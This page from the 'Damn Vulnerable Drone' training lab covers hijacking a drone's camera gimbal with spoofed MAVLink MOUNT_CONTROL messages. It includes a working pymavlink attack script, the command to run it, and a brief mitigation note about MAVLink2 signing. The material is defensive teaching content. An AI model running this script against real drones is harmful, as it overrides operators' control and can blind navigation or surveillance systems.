<i>Hijacking gimbal control of the drone’s onboard camera using spoofed MAVLink MOUNT_CONTROL messages.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Injection > Camera Gimbal Takeover

# Description

Camera gimbals on drones are typically controlled using MAVLink <code>MOUNT_CONTROL</code> messages that instruct the gimbal to adjust its pitch, yaw, or roll. If an attacker gains access to the communication link between the Ground Control Station (GCS) and the drone, they can spoof these commands to take control of the gimbal, overriding the legitimate operator's commands.

This can be used to disrupt reconnaissance missions, blind vision-based navigation systems, or manipulate surveillance video streams.

# Resources

- <a href="https://mavlink.io/en/messages/common.html#MOUNT_CONTROL">MAVLink: MOUNT_CONTROL</a>  
- <a href="https://ardupilot.org/copter/docs/common-mount-setup.html">ArduPilot Mount Setup</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Setup</h3>
<p>Install required Python libraries:</p>

<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install python3 python3-pip
pip3 install pymavlink
</code></pre>

---

<h3>Step 2. Create the Script</h3>
<p>Save the following as <code>gimbal_takeover.py</code>:</p>

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil
import sys
import time

def connect_drone(ip, port):
    master = mavutil.mavlink_connection(f'tcp:{ip}:{port}')
    master.wait_heartbeat()
    print("[+] Connected to drone")
    return master

def send_gimbal_command(master, pitch=0, roll=0, yaw=0):
    master.mav.mount_control_send(
        master.target_system,
        master.target_component,
        pitch * 100,   # centidegrees
        roll * 100,
        yaw * 100,
        0  # MAV_MOUNT_MODE_MAVLINK_TARGETING
    )
    print(f"[>] Sent gimbal control: pitch={pitch}, roll={roll}, yaw={yaw}")

def main(ip, port):
    master = connect_drone(ip, port)
    while True:
        send_gimbal_command(master, pitch=-45, yaw=90)  # Look down and right
        time.sleep(2)
        send_gimbal_command(master, pitch=0, yaw=0)     # Reset center
        time.sleep(2)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python gimbal_takeover.py &lt;ip:port&gt;")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(":")
    main(target_ip, int(target_port))
</code></pre>

---

<h3>Step 3. Run the Script</h3>
<pre><code class="code mb-3 mt-3">sudo python3 gimbal_takeover.py 10.13.0.3:5760</code></pre>

<p>You can replace the IP and port with any reachable drone telemetry endpoint. If successful, the camera gimbal will sweep up/down or rotate unexpectedly.</p>

---

<h3>Step 4. Monitor the Effects</h3>
<ul>
  <li>QGroundControl or MAVProxy may show unexpected gimbal motion</li>
  <li>Camera feed will tilt or spin erratically</li>
  <li>Autonomous features relying on stable vision may fail</li>
</ul>

---

<h3>Step 5. Mitigation</h3>
<p>Restrict external MAVLink sources and use signing (MAVLink2) to prevent unauthorized spoofing. Consider moving gimbal control to an encrypted companion link where possible.</p>

</details>
